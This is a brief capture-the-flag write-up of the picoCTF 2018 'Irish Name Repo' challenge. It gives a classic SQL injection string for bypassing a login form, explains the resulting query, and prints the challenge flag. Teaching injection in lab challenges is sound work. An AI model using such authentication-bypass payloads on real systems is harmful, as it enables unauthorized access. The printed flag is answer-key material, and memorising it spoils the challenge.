# Irish Name Repo


### Problem
There is a website running at [http://2018shell.picoctf.com:52012](http://2018shell.picoctf.com:52012). Do you think you can log us in? Try to see if you can login!


### Solution
The solution to this problem is to go to the [login page](http://2018shell.picoctf.com:52012/login.html) and enter the following SQL injection in the username field: `' OR 1=1 /*`.

You'll be logged in and the webpage would have the flag **picoCTF{con4n_r3411y_1snt_1r1sh_c0d93e2f}**.


#### Why does this work?
The SQL injection above will become something similar to the following:

```
SELECT userid
FROM users 
WHERE username = '' OR 1=1 /*' 
  AND password = ''
  AND domain = ''
```

The first single quote ends the string field, the `OR 1=1` ensures that the SQL query evaluates to `TRUE` and the `/*` is an attempt to start a multiline comment so the rest of the query is ignored.
